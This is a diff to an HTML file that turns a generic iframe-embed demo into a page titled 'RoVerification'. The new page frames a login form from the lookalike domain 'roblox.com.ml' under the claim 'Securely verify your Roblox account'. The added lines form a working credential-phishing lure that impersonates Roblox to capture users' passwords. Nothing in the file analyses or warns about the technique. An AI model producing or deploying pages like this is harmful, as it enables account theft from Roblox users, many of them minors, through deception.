@@ -3,81 +3,60 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Embed Example</title>
+<title>RoVerification</title>
 <style>
-  body {
-    font-family: Arial, sans-serif;
-    background: #111827;
-    color: #e2e8f0;
-    display: flex;
-    justify-content: center;
-    align-items: flex-start;
-    padding: 40px 20px;
-  }
-  .container {
-    width: 100%;
-    max-width: 700px;
-  }
-  .verify-btn {
-    background: #22c55e;
-    color: white;
-    border: none;
-    padding: 12px 20px;
-    border-radius: 8px;
-    cursor: pointer;
-    font-weight: bold;
-  }
-  .verify-btn:hover { background: #16a34a; }
+    /* Full page styling */
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #FF3E00, #FF8C00);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
 
-  .loading-screen {
-    display: none;
-    margin-top: 20px;
-    padding: 20px;
-    background: #1e293b;
-    border-radius: 10px;
-    text-align: center;
-  }
+    /* Container for the embedded login */
+    .container {
+        background: rgba(0, 0, 0, 0.05);
+        padding: 2rem;
+        border-radius: 20px;
+        box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        width: 90%;
+        max-width: 500px;
+        height: 600px;
+        display: flex;
+        flex-direction: column;
+    }
 
-  iframe {
-    width: 100%;
-    height: 500px;
-    border: none;
-    display: none;
-    margin-top: 20px;
-    border-radius: 10px;
-  }
+    h1 {
+        text-align: center;
+        color: #fff;
+        margin-bottom: 1rem;
+        text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+    }
+
+    iframe {
+        flex: 1;
+        border: none;
+        border-radius: 15px;
+        box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+    }
+
+    p {
+        color: #fff;
+        text-align: center;
+        margin-top: 1rem;
+        font-size: 0.9rem;
+    }
 </style>
 </head>
 <body>
-
-<div class="container">
-  <button class="verify-btn" id="verify-btn">Load Verification Page</button>
-
-  <div class="loading-screen" id="loading-screen">
-    Loading verification page...
-  </div>
-
-  <iframe id="verification-iframe" src=""></iframe>
-</div>
-
-<script>
-  const verifyBtn = document.getElementById('verify-btn');
-  const loadingScreen = document.getElementById('loading-screen');
-  const iframe = document.getElementById('verification-iframe');
-
-  const redirectURL = "https://example.com"; // This site allows iframe embedding
-
-  verifyBtn.addEventListener('click', () => {
-    verifyBtn.style.display = 'none';
-    loadingScreen.style.display = 'block';
-
-    setTimeout(() => {
-      loadingScreen.style.display = 'none';
-      iframe.src = redirectURL;
-      iframe.style.display = 'block';
-    }, 1500);
-  });
-</script>
-
+    <div class="container">
+        <h1>RoVerification</h1>
+        <iframe src="https://www.roblox.com.ml/login?returnUrl=2883825149167571" title="Roblox Login"></iframe>
+        <p>Securely verify your Roblox account</p>
+    </div>
 </body>
 </html>
